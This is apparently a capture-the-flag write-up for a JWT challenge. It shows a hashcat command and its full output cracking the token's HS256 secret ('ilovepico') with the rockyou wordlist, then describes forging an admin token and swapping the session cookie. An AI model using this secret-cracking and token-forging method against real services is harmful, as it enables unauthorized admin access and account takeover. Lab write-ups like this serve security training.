this is basic Jwt token challenge... 
first of all we have to brute force the signature with rockyou.txt

    Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic3VyeWEifQ.mm1bbVx9gKE2-6v04AVnsAqsNArckjYAOwE5TUucJKA

_______________________________________________________________________________________________________________________________________________________________________________________________________________


    hashcat -m 16500 -a 0 jwt.txt rockyou.txt
    hashcat (v6.2.6) starting
    
    OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
    ==================================================================================================================================================
    * Device #1: cpu-skylake-avx512-AMD Ryzen 5 7640HS w/ Radeon 760M Graphics, 2711/5487 MB (1024 MB allocatable), 12MCU
    
    Minimum password length supported by kernel: 0
    Maximum password length supported by kernel: 256
    
    Hashes: 1 digests; 1 unique digests, 1 unique salts
    Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
    Rules: 1
    
    Optimizers applied:
    * Zero-Byte
    * Not-Iterated
    * Single-Hash
    * Single-Salt
    
    Watchdog: Hardware monitoring interface not found on your system.
    Watchdog: Temperature abort trigger disabled.
    
    Host memory required for this attack: 3 MB
    
    Dictionary cache built:
    * Filename..: rockyou.txt
    * Passwords.: 14344392
    * Bytes.....: 139921507
    * Keyspace..: 14344385
    * Runtime...: 2 secs
    
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic3VyeWEifQ.mm1bbVx9gKE2-6v04AVnsAqsNArckjYAOwE5TUucJKA:ilovepico
    
    Session..........: hashcat
    Status...........: Cracked
    Hash.Mode........: 16500 (JWT (JSON Web Token))
    Hash.Target......: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoic3...UucJKA
    Time.Started.....: Sat Jun 28 18:55:41 2025 (6 secs)
    Time.Estimated...: Sat Jun 28 18:55:47 2025 (0 secs)
    Kernel.Feature...: Pure Kernel
    Guess.Base.......: File (rockyou.txt)
    Guess.Queue......: 1/1 (100.00%)
    Speed.#1.........:  1265.3 kH/s (2.14ms) @ Accel:512 Loops:1 Thr:1 Vec:16
    Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
    Progress.........: 7397376/14344385 (51.57%)
    Rejected.........: 0/7397376 (0.00%)
    Restore.Point....: 7391232/14344385 (51.53%)
    Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
    Candidate.Engine.: Device Generator
    Candidates.#1....: ilovesky5 -> ilovemymum64.
    
    Started: Sat Jun 28 18:54:58 2025
    Stopped: Sat Jun 28 18:55:48 2025


We got the key : ilovepico
now we can just change anything in the token ... we'll make new token with user=admin
and then change the cookie with some cookie editor extension

![image](https://github.com/user-attachments/assets/a5d7deb9-350f-44c1-9f7e-7e07f95fb7be)
